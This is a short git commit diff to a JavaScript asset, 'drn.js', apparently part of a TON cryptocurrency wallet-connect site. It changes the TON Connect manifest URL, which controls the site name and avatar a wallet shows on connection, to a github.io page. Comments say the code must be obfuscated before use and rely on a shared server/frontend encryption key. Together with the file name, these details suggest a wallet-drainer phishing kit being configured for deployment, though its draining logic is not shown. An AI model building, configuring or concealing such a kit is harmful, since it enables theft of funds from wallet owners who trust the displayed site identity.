b1eba259ad0a2fdfaa183e9f2e84aac1dd4af792
Sokilpng <momamt3@gmail.com>
2025-12-29 00:35:28 +0300

    drn.js

--- assets/js/drn.js
+++ assets/js/drn.js
@@ -2,7 +2,7 @@
 // OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/
 
 // Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
-const manifestUrl = 'https://tonpsa.onrender.com/tonconnect-manifest.json';
+const manifestUrl = 'https://sokilpng.github.io/Ton-site//tonconnect-manifest.json';
 
 // The encryption key between the server and Frontend must be the same
 let keyEncr = 500;
@@ -610,4 +610,5 @@ document.addEventListener('DOMContentLoaded', async () => {
     } catch (e) {
 
     }
+
 });
